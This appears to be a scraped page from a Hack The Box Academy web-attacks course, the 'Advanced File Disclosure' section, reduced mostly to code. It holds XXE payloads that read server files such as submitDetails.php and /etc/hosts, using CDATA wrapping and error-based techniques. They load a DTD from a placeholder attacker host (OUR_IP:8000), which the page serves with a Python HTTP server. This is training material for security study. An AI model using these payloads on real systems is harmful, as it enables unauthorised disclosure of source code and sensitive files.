<!--
 // Platform: Academy
// URL: https://academy.hackthebox.com/module/134/section/1206
// Platform Version: V1
// Module ID: 134
// Module Name: Web Attacks
// Module Difficulty: Medium
// Section ID: 1206
// Section Title: Advanced File Disclosure
// Page Title: Hack The Box - Academy
// Page Number: 15
-->

# Advanced File Disclosure

**Module Name:** Web Attacks **Page Number:** 15

#### 

#### WEB ATTACKS

# Advanced File Disclosure

## Advanced Exfiltration with CDATA

``` xml
<!DOCTYPE email [
  <!ENTITY begin "<![CDATA[">
  <!ENTITY file SYSTEM "file:///var/www/html/submitDetails.php">
  <!ENTITY end "]]>">
  <!ENTITY joined "&begin;&file;&end;">
]>
```

``` xml
<!ENTITY joined "%begin;%file;%end;">
```

``` shell-session
[!bash!]$ echo '<!ENTITY joined "%begin;%file;%end;">' > xxe.dtd
[!bash!]$ python3 -m http.server 8000

Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```

``` xml
<!DOCTYPE email [
  <!ENTITY % begin "<![CDATA["> <!-- prepend the beginning of the CDATA tag -->
  <!ENTITY % file SYSTEM "file:///var/www/html/submitDetails.php"> <!-- reference external file -->
  <!ENTITY % end "]]>"> <!-- append the end of the CDATA tag -->
  <!ENTITY % xxe SYSTEM "http://OUR_IP:8000/xxe.dtd"> <!-- reference our external DTD -->
  %xxe;
]>
...
<email>&joined;</email> <!-- reference the &joined; entity to print the file content -->
```

![https://academy.hackthebox.com/storage/modules/134/web_attacks_xxe_php_cdata.jpg](https://academy.hackthebox.com/storage/modules/134/web_attacks_xxe_php_cdata.jpg)

## Error Based XXE

![https://academy.hackthebox.com/storage/modules/134/web_attacks_xxe_cause_error.jpg](https://academy.hackthebox.com/storage/modules/134/web_attacks_xxe_cause_error.jpg)

``` xml
<!ENTITY % file SYSTEM "file:///etc/hosts">
<!ENTITY % error "<!ENTITY content SYSTEM '%nonExistingEntity;/%file;'>">
```

``` xml
<!DOCTYPE email [ 
  <!ENTITY % remote SYSTEM "http://OUR_IP:8000/xxe.dtd">
  %remote;
  %error;
]>
```

![https://academy.hackthebox.com/storage/modules/134/web_attacks_xxe_exfil_error_2.jpg](https://academy.hackthebox.com/storage/modules/134/web_attacks_xxe_exfil_error_2.jpg)

# 

# 

#### Questions

####